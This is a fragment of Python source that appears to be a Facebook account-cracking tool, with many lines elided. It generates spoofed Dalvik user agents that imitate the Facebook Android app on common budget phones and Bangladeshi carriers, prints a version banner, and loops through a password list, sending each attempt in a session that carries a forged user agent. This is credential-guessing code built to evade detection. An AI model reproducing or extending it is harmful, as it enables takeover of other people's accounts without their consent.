...
def generate_davik_user_agent():
    android_versions = [
        "8.1.0", "9.0.0", "10.0.2", "11", "12"
    ]
    devices = [
        "Galaxy A6 (2018)", "Redmi Note 8 Pro", "Galaxy J7 Prime",
        "Infinix Hot 10", "Realme C25", "Oppo A5s", "Vivo Y20"
    ...
    fb_versions = [
        "340.0.0.21.116", "353.0.0.10.21", "360.0.0.15.120"
    ]
    carriers = ["Robi", "Airtel", "Grameenphone", "Banglalink"]
...
\033[92;1m[\033[91;1m●\033[92;1m] VERSION     \033[91;1m●\033[92;1m 3.6
\33[1;37m==============================================""")
def linex():
        print(f"\33[1;37m==============================================""")
def clear():
        ...
        try:
            ...
            for pw in psw:
                ...
                with requests.Session() as session:
                    ...
                    headers={'User-Agent':generate_davik_user_agent(),
